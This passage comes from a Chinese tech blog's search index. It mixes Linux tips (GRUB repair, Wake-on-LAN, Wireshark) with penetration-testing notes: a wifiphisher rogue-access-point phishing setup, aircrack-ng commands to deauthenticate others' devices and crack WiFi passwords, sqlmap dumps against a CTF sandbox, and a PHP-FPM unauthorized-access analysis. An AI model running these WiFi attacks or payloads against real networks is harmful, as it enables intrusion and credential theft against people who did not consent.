将DNS服务器改成8.8.8.8","link":"/TechnicalExperience/Linux/Secretkey-failure.html"},{"title":"Linux常用好软推荐","text":"记录我自己喜欢的linux软件，此文章长期更新 screenkeyA screencast tool to display your keys inspired by Screenflick tmuxA terminal multiplexer IpythonProductive Interactive Computing Installation method: pip Qv2rayCross-platform V2ray Client written in Qt (Stable Release) Installation method: yay batCat clone with syntax highlighting and git integration vim -d: diff -b: bin fzf非常好用的文件模糊搜索工具，支持vim gitg简单的git图形化工具 fd「 fd是一种简单ㄡ快速和用户友好的find替代方案.」 CommitizenCommitizen是一个撰写合格 Commit message 的工具。 install: $ npm install -g commitizen rgcode搜索工具，以行为单位，是grep的替代工具，速度更快 install: pacman -S ripgrep agcode搜索工具，以行为单位，是grep的替代工具，速度更快 install: pacman -S the_silver_searcher","link":"/TechnicalExperience/Linux/awesome-software.html"},{"title":"备份Manjaro","text":"在256G的平板电脑装双系统，使用因为第一次使用linux时觉得70G够用（源自于学习只装40G的自信），所以在电脑上的格局是win系统60G，win软件110G，linux根目录30G，/home30G. 没错，和我想的一样，在不打游戏的linux上个人做点小事确实是够用了，空间还很充足（余个10G左右），but，我发现了百度云命令行版，于是想把系统备份一下（作为一个过来人，备份很重要，要不是因为电脑空间小，才不会使用百度云） 为了备份/home25G，/usr15G这两个空间大户，使用了压缩效率非常棒的xz格式压缩，而且分开压缩，分开上传。 xz压缩率是真的棒，就是花的时间有点久 /home 25G –&gt; 12G /usr 17G –&gt; 4.45G 我删了很多大型IDE，如eclipse，IDEA，pycharm等等，使用软件管理器卸载，结果我发现了一点不对经。。。你猜怎么着，打不开应用列表、添加不了桌面配件等等有关桌面的问题产生了，虽然吧在linux上桌面没了也不要紧，还有命令行嘛，但是，没桌面怎么看小姐姐看视频学习，所以我去查看pacman日志到底是删了哪些重要的东西。 看了半天，嗯～噢～，我发现我没看懂到底是哪个软件的问题，然后重启吧，发现网络也出问题了（大哭）。 我就这么废了半天去找是哪个软件的问题，最终我发现，还是重装吧，不过不是系统重装（作为一个垃圾程序员，不到万不得已是不会重装的），而是重新装一下桌面。 没网怎么装，USB连接手机就有了。 重新安装了nerworkmanager、sddm-kcm、sddm、kde-applications，并启动相关服务，重启，OK它回来了，因为配置什么的还在，所以也没损失什么。 这次给我的教训就是，别乱卸文件，一两个到没啥，卸多的时候一定要慎重考虑，最好使用命令卸，如果你不知道软件管理是采用什么模式卸载 今天差点想弄死自己，手贱。","link":"/TechnicalExperience/Linux/backup-tablet.html"},{"title":"linux误删ESP分区?开机无法引导进linux?pacman -Syu后无法进入系统?","text":"此文章适合Manjaro+Windows10双系统&amp;UEFI+GPT食用, 其他情况仅供参考. 博主在Win系统中误操作中格式化了引导Manjaro的ESP(EFI System Partition)分区, 这下好了, 开机只能进Win10. 虽然我知道备份数据+重装系统不失为一种好方法, 但身为一个年轻人, 不折腾折腾怎么行? 所以开始查资料恢复ESP, 由于不是很懂linux系统启动原理导致走了很多弯路, 整理成文章分享给大家. 新建引导操作前需要准备一点东西: U盘 一个多余的操作系统 制作livecd(U盘启动盘)先去Manjaro官网下载iso镜像文件(或者镜像站下载, 这里推荐清华镜像站), 如果使用的是Win10操作系统, 建议使用rufus工具向U盘写入镜像; 如果是Linux操作系统, 使用dd指令即可. 如果是Android系统, 能接入U盘并识别的话, 可以考虑使用Termux的dd指令. 进入livecd将U盘插入需要修复的电脑进入BIOS, 选择U盘启动, 进入临时的Manjaro系统. 挂载&amp;chroot打开终端输入以下指令自动挂载电脑上的Manjaro操作系统, 自动chroot. 12sudo manjaro-chroot -a## 正常情况等待提示输入'1'即可 注意, 如果是格式化esp分区(uuid发生变化), 会导致格式化的分区不能自动挂载, 有两种解决方案 进入chroot后修改/etc/fstab修改格式化分区uuid后再次使用上述指令 清楚你的linux系统所在分区, 并尝试手动挂载 因为我是格式化的esp分区, 不能自动挂载上efi分区, 我尝试的是手动挂载, 列出我挂载的分区 /dev/nvme0n1p7 –&gt; /mnt/Manjaro/ /dev/nvme0n1p6 –&gt; /mnt/Manjaro/boot/ Restore_the_GRUB_Bootloader/dev/nvme0n1p8 –&gt; /mnt/Manjaro/home/ /dev/nvme0n1p9 –&gt; /mnt/Manjaro/boot/efi/ 手动挂载还需要输入以下指令 1234567sudo mount -t proc proc /mnt/procsudo mount -t sysfs sys /mnt/syssudo mount -o bind /dev /mnt/devsudo mount -t devpts pts /mnt/dev/pts/sudo modprobe efivarfssudo chroot /mntmount -t efivarfs efivarfs /sys/firmware/efi/efivars 重装并更新grub123sudo grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=manjaro --rechecksudo update-grub# 提示'未知的设备nvme0n1'不用管他 如果上述指令无误的话就可以重启了. 注意格式化esp分区的需要修改/etc/fstab文件的UUID, 不然重启会出现挂载超时提示, 进不了系统. 进入系统后再次输入update-grub, grub会识别到电脑的其他系统, 开机才会出现grub多重引导. pacman -Syu后无法进入系统进入系统后, 熟练的输入了pacman -Syu(距离上一次更新2个月了), 提示失败, 尝试数次, 成功. 重启后…引导不见了? 并且系统黑屏, 不能切换tty. 粗略猜测内核错误, 使用U盘chroot后, 输入pacman -S Linux后再次重启, 成功进入系统. 参考文章 Restore_the_GRUB_Bootloader 第十九章、开机流程、模组管理与Loader","link":"/TechnicalExperience/Linux/restore-ESP.html"},{"title":"unzip乱码","text":"arclinux,manjaro解决unzip不能指定编码问题 安装kde-servicemenus-unarchiver 1yay -S kde-servicemenus-unarchiver 使用-e指定编码 1unar -e GBK test.zip","link":"/TechnicalExperience/Linux/unzip-Garbled.html"},{"title":"wifiphisher安装与使用","text":"Wifiphisher是用于进行红队参与或Wi-Fi安全测试的恶意访问点框架。使用Wifiphisher，渗透测试人员可以通过执行有针对性的Wi-Fi关联攻击轻松地在针对无线客户端的中间人位置。Wifiphisher可以进一步用于对连接的客户端发起受害者自定义的网络钓鱼攻击，以捕获凭据（例如，从第三方登录页面或WPA / WPA2预共享密钥）或用恶意软件感染受害者站点。 曾使用字典暴力破解wifi，花费时间太长，而且不一定成功（与字典有关），所以尝试一下钓鱼 安装与使用前提： Kali Linux 或者其他linux发行版； 一个支持AP模式的无线网络适配器，驱动要求支持netlink； 一个支持Monitor模式并且能够实现命令注入的无线网络适配器，驱动要求支持netlink。如果你没有这种适配器，那么你在运行WiFiPhisher时请使用—nojamming选项； 安装官方推荐在kali上使用wifiphisher，本着学习精神，我决定在我的manjaro上尝试安装 在我的manjaro折腾了一天(虽然软件管理pacman有wifiphisher，但是因为python2-scapy的依赖问题导致构建不成功)。于是从github上下载1.4版本，从python2到python3，从pip2到pip3，自己手动下载各种依赖:angel:，最后发现不是依赖的问题，是发布的wifiphisher-1.4版本貌似只支持python2，但使用python2安装后，报错 1ImportError: cannot import name hostapd_controller 这就很奇怪，明明1.4已经说了解决了hostapd的问题。在lssue也没找到很好的解决方法（看英文看到头痛） 于是直接clone最新开发进度，使用python3进行安装 使用在终端使用wifiphisher进入了界面，但是搜不到接入点 可能是网卡的缘故吧，官方对网卡的要求 一个无线网络适配器，支持AP＆Monitor模式并能够注入。驱动程序应支持netlink。 使用iw list查了下我的网卡 123456789Supported interface modes: * IBSS * managed * AP * monitor * mesh point * P2P-client * P2P-GO * P2P-device 可以看到是支持AP和监听的，难道是不能注入？ 尝试使用指令查看是否支持注入，结果 1234➜ ~ aireplay-ng -9 wlp1s0 11:02:52 Trying broadcast probe requests...11:02:53 No Answer...11:02:53 Found 0 APs manjaro很多关于网络的指令都没有，需要自行安装net-tools(ifconfig)，aircrack-ng(aireplay-ng) 正在摸索中，考虑网卡的原因，下单了一个3070芯片的网卡，插上后输入在我的电脑里的设备名是wlp0s20f0u1 再次使用wifiphisher 1sudo wifiphisher -i wlp0s20f0u1 当只有一个网卡且这个网卡支持监听和AP时，可以使用-i手动生成恶意AP并进行攻击 如果有多余的网卡，使用-eI参数指定监听网卡，-aI指定生成AP的网卡，更多参数参见wifiphisher -h 成功了！ 选择攻击目标后的钓鱼方案 攻击成功！ 手机连接后跳转界面 选择攻击方案的模板可自定义，在我的电脑上模板路径是/usr/lib/python3.8/site-packages/wifiphisher-1.4-py3.8.egg/wifiphisher/data/phishing-pages 声明 请不要在没有征得目标网络管理员许可的情况下利用WiFiPhisher实施攻击，这种行为将会被视作非法活动。笔者不承担任何责任，请谨慎使用。 参考文章 测试注入 wifiphisher官方 多版本Python安装pip及pip版本管理终极教程 2to3 - 自动将 Python 2 代码转为 Python 3 代码 aircrack-ng判断网卡是否兼容","link":"/TechnicalExperience/Linux/wifiphisher-install.html"},{"title":"Manjaro+微星B365M主板设置wol","text":"wol(wake on Lan), 局域唤醒主机 首先需要在主板上设置网络唤醒，PCI唤醒 Manjaro系统安装ethtool工具， 查看网卡是否支持wol 123&gt; sudo ethtool eno1Supports Wake-on: pumbg Wake-on: g 如果Wake-on参数是d(disabled)，使用指令ethtool -s NIC_name wol g设置成g(magic packet activity) 查看tlp服务, 将tlp服务设置成开启自启 sudo systemctl status tlp sudo systemctl enable tlp 更改tlp配置 1234&gt; vim /etc/tlp.confTLP_ENABLE=1WOL_DISABLE=N 其他无显示器设置x11vnc分辨率 安装xf86-video-dummy 1❯ sudo pacman -S dummy 添加配置文件 1234567891011121314151617181920212223❯ sudo vim /usr/share/X11/xorg.conf.d/xorg.confSection &quot;Device&quot; Identifier &quot;Configured Video Device&quot; Driver &quot;dummy&quot;EndSection Section &quot;Monitor&quot; Identifier &quot;Configured Monitor&quot; HorizSync 31.5-48.5 VertRefresh 50-70EndSection Section &quot;Screen&quot; Identifier &quot;Default Screen&quot; Monitor &quot;Configured Monitor&quot; Device &quot;Configured Video Device&quot; DefaultDepth 24 SubSection &quot;Display&quot; Depth 24 Modes &quot;1024x800&quot; EndSubSectionEndSection reboot","link":"/TechnicalExperience/Linux/wol.html"},{"title":"使用wireshark分析TCP、UDP","text":"分析完理论知识后，不实践怎么知道是不是真的，wireshark就是一个非常方便的抓包工具，先用它来分析TCP和UDP 安装Manjaro/Archlinux系统，安装指令 1pacman -Ss wireshark 使用抓包涉及更高的权限，需要sudo使用 抓包界面 分为上中下三个窗口，最上面的窗口显示的是包的简略信息，中间是详细信息，下面是原始16进制数据。 分析TCPwireshark将SEQ设置为相对，为了方便观察，也就是从0开始，不适和新手了解TCP协议，需要在TCP简略包上右键鼠标–&gt;首选项–&gt;relative sequence number关闭 使用过滤器可以过滤其他不必要的协议 通过给http给服务器上传文件进行抓包得到以下界面 三次握手 通过上图分析，我的计算机发送SYN标志tcp报文段，服务端回应了我SYN-ACK报文段，我的计算机回应ACK，三次握手建立连接完毕，然后开始发送数据（PSH表示不需要缓存，及时上交）。 连接成功后的发送方和接收方的SEQ=上一次SEQ+Len 此外我还发现了我的计算机发送的第一个tcp报文端的选项区 SACK_PERM=1 TSval=3007114814 TSecr=0 WS=128 SACK表示选择性ACK，将提前到达的ACK序号放在这个字段，这样就避免了不必要的重传 TSval(Timestamp value)和TSecr(Timestamp Echo Reply)都是32位的，发送方将当前时间填入TSval，接收方将当前时间填入TSecr，作用就是计算RTT(Round-Trip-Time)和防止回绕 WS（15位）用来扩大Win（16位），将Win扩大到31bit，128表示2的7次方，Win向左移动了7位 我的数据包最后还有这样一段英文 1[TCP segment of a reassembled PDU] 它代表该TCP区段是属于上层（比如HTTP）协议的数据 选项区参考 是否丢包 打开序列/时间统计图，路径：统计–&gt;TCP流图形–&gt;时间序列 观察到序列号都是上升的，说明没有丢包，丢包在抓包过程中也会有提示（TCP Retransmission） 计算吞吐量因为我使用HTTP协议进行传输数据，所以直接在http的post就能查看本次传输的相关信息 在TCP首选项里打开calculate conversation timestamp 观察TCP层 $$吞吐量=153010bytes/1.885852617s=81135.714byte/s=79.2340964389k/s$$ 四次挥手 重抓了一遍，这里只考虑正常的释放过程，其他本人知识水平不够暂不研究 分析UDPQQ登录使用的就是UDP协议，它自己在应用层的协议是OICQ UDP报文段很简单，简单观察可以知道UDP有四个字段，每个字段占2字节，接下来分析UDP和IP的里面的长度是什么关系 仅考虑IPv4 IP长度=IP头（20字节）+UDP头（8字节）+UDP数据 UDP长度=UDP头（8字节）+UDP数据 有效负载length只有2byte=65536bit，所以有效负载=65536-8=65528字节 发送与接收的端口关系发送者发送端口号在接收返回（响应）UDP 时候会变成接收端口号。接收者发送返回（响应）UDP 时候接受端口号会变成发送端口号。","link":"/TechnicalExperience/Network/TCP-UDP.html"},{"title":"aircrack-ng破解wifi","text":"但是使用wifiphisher的情况并没有我想象的那样强大，应该是我的操作问题吧，只是生成了一个假热点，并将用户重定向至钓鱼页面，并没有断开连接原来wifi的设备 在查找资料时碰到了这个工具包，有一个功能就是强制断开他人的wifi，挺有趣的记下笔记 使用前提，支持监听注入的网卡 step1使用iwconfig查看网卡加载情况 step2airmon-ng check kill杀掉所有网络进程 如果杀掉后自动启动的话，建议使用systemctl stop杀得彻底些 step3airmon-ng start wlp0s20f0u1启动网卡监听模块 注意网卡名字会变成wlp0s20f0u1mon step4airodump-ng wlp0s20f0u1mon开始监听 PWR是信号强度，越小信号越强 CH代表信道 step5airodump-ng -c 6 --bssid 网络mac地址 -w filename wlp0s20f0u1mon开始抓包 -c，指的是信道CH –bssid，指的是AP mac地址 -w，输出的文件路径 STATION代表的是设备mac，由几个mac就代表有几个设备 当有设备重新连接时，就会抓到握手包，放到-w指定的文件里，下一步介绍强制掉线 step6aireplay-ng -0 0 -a AP_mac -c 设备mac wlp0s20f0u1mon强制wifi掉线 重连时就会抓到握手包 step7aircrack-ng -a2 -b AP_mac -w 字典.txt filename.cap跑字典，爆破密码 参考文献【无线攻防】使用aircrack-ng工具破解wifi密码","link":"/TechnicalExperience/Penetration/aircrack-ng.html"},{"title":"ctf-linux-cmd.md","text":"使用 linux 系统解题的一些小技巧 将文本内容进行 url 编码 1cat file.txt | xxd -plain | sed -r 's/(..)/%\\1/g' | tr -d '\\n' 将文本内容进行 url 解码 12echo -n '%68%65%6c%6c%6f' | sed 's/%//g' | xxd -r -pecho -n '%68%65%6c%6c%6f' | tr -d '%' | xxd -r -p bc 进制转换 1echo &quot;obase=16;ibase=2;11101&quot; | bc","link":"/TechnicalExperience/Penetration/ctf-linux-cmd.html"},{"title":"ctfhub.md","text":"在ctfhub的一点一滴 Sql注入sqlmap的基础用法123456# 列出表名python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 --tables# 列出列名python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag --columns# 查数据python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag -C flag --dump 转载自 CTFHUB CTF竞赛模式具体分为以下几类： CTF 赛事理论知识理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选 Jeopardy-解题参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。 AwD-攻防模式Attack with Defense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。 RHG-自动化[ AI自动化]Robo Hacking Game(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。 RW-真实世界Real World(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。 KoH-抢占山头King of Hill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。 Mix[混合]混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。 CTF 题目类型在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如移动设备(Mobile), 电子取证(Forensics)等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag WebWeb类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如SQL注入、XSS、代码执行、代码审计等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件 PwnPwn类题目重点考察选手对于二进制漏洞的挖掘和利用能力，其考点也通常在堆栈溢出、格式化漏洞、UAF、Double Free等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(Exploit)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为nc IP_ADDRESS PORT，例如nc 1.2.3.4 4567这种形式，表示在1.2.3.4这个IP的4567端口上运行了该题目 ReverseRe类题目考察选手逆向工程能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag CryptoCrypto类题目考察选手对密码学相关知识的了解程度，诸如RSA、AES、DES等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。 MiscMisc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。","link":"/TechnicalExperience/Penetration/ctfhub.html"},{"title":"Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写","text":"转载自 Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 搭过php相关环境的同学应该对fastcgi不陌生，那么fastcgi究竟是什么东西，为什么nginx可以通过fastcgi来对接php？ Fastcgi RecordFastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。 HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。 类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。 和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下： 123456789101112131415161718typedef struct { /* Header */ unsigned char version; // 版本 unsigned char type; // 本次record的类型 unsigned char requestIdB1; // 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; // body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength];} FCGI_Record; 头由8个uchar类型的变量组成，每个变量1字节。其中，requestId占两个字节，一个唯一的标志id，以避免多个请求之间的影响；contentLength占两个字节，表示body的大小。 语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。 可见，一个fastcgi record结构最大支持的body大小是2^16，也就是65536字节。 Fastcgi Type刚才我介绍了fastcgi一个record中各个结构的含义，其中第二个字节type我没详说。 type就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过type来标志每个record的作用，用requestId作为同一次请求的id。 也就是说，每次请求，会有多个record，他们的requestId是相同的。 借用该文章中的一个表格，列出最主要的几种type： 看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是type为1的record，后续互相交流，发送type为4、5、6、7的record，结束时发送type为2、3的record。 当后端语言接收到一个type为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243typedef struct { unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */ unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */ unsigned char nameData[nameLength]; unsigned char valueData[valueLength];} FCGI_NameValuePair11;typedef struct { unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */ unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];} FCGI_NameValuePair14;typedef struct { unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */ unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength];} FCGI_NameValuePair41;typedef struct { unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];} FCGI_NameValuePair44; 这其实是4个结构，至于用哪个结构，有如下规则： key、value均小于128字节，用FCGI_NameValuePair11 key大于128字节，value小于128字节，用FCGI_NameValuePair41 key小于128字节，value大于128字节，用FCGI_NameValuePair14 key、value均大于128字节，用FCGI_NameValuePair44 为什么我只介绍type为4的record？因为环境变量在后面PHP-FPM里有重要作用，之后写代码也会写到这个结构。type的其他情况，大家可以自己翻文档理解理解。 PHP-FPM（FastCGI进程管理器）那么，PHP-FPM又是什么东西？ FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。 FPM按照fastcgi的协议将TCP流解析成真正的数据。 举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对： 12345678910111213141516{ 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': &quot;localhost&quot;, 'SERVER_PROTOCOL': 'HTTP/1.1'} 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。 Nginx（IIS7）解析漏洞Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability），该漏洞现象是，在用户访问http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析了。 用户请求http://127.0.0.1/favicon.ico/.php，nginx将会发送如下环境变量到fpm里： 12345678{ ... 'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php', 'SCRIPT_NAME': '/favicon.ico/.php', 'REQUEST_URI': '/favicon.ico/.php', 'DOCUMENT_ROOT': '/var/www/html', ...} 正常来说，SCRIPT_FILENAME的值是一个不存在的文件/var/www/html/favicon.ico/.php，是PHP设置中的一个选项fix_pathinfo导致了这个漏洞。PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，fpm会判断SCRIPT_FILENAME是否存在，如果不存在则去掉最后一个/及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。 所以，第一次fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。 正确的解决方法有两种，一是在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。 security.limit_extensions配置写到这里，PHP-FPM未授权访问漏洞也就呼之欲出了。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。 此时，SCRIPT_FILENAME的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404： 在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions： 1234567; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions = .php .php3 .php4 .php5 .php7 其限定了只有某些后缀的文件允许被fpm执行，默认是.php。所以，当我们再传入/etc/passwd的时候，将会返回Access denied.： ps. 这个配置也会影响Nginx解析漏洞，我觉得应该是因为Nginx当时那个解析漏洞，促成PHP-FPM增加了这个安全选项。另外，也有少部分发行版安装中security.limit_extensions默认为空，此时就没有任何限制了。 由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。 